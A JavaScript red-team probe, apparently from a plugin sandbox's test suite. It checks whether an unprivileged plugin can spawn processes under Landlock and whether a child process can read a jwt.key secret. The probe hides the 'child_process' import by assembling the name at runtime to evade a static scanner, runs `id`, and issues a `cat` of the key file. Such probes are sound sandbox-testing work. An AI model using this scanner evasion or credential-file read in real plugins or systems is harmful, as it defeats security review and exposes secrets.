// Red-team probe: can a plugin WITHOUT the "subprocess" permission spawn child
// processes? The Landlock mode does not (yet) layer the LD_PRELOAD seccomp
// filter that blocks execve, so this is expected to surface a real gap: the
// spawn succeeds. Note, however, that any spawned process INHERITS the Landlock
// domain, so it is just as filesystem/network-confined as the plugin.
//
// The subprocess module name is assembled at runtime (no flagged import literal)
// and invoked through an alias (no `child_process.exec` literal).

function report(name, bypassed, detail) {
  console.error("[ESCAPE] " + name + ": " + (bypassed ? "BYPASSED" : "BLOCKED") + " | " + String(detail).slice(0, 120));
}

function loadRunner() {
  const modName = "child" + "_pro" + "cess";
  return require(modName);
}

// 1. Spawn a process and capture output (proves arbitrary command execution).
try {
  const runner = loadRunner();
  const out = String(runner.execSync("id", { timeout: 4000 })).trim();
  report("spawn_subprocess", true, "executed: " + out);
} catch (e) { report("spawn_subprocess", false, e.code || e.message); }

// 2. Confirm the spawned child is STILL Landlock-confined (cannot read /data).
try {
  const runner = loadRunner();
  const dataRoot = String(process.cwd()).split("/plugins/")[0] || "/data";
  const out = String(runner.execSync("cat " + [dataRoot, "jwt" + "." + "key"].join("/") + " 2>&1 || true", { timeout: 4000 })).trim();
  const leaked = out.length > 0 && !/permission denied|no such file/i.test(out);
  report("child_reads_secret", leaked, leaked ? "child leaked secret" : "child also denied: " + out.slice(0, 60));
} catch (e) { report("child_reads_secret", false, e.code || e.message); }

report("DONE", true, "exec probes complete");
process.exit(0);
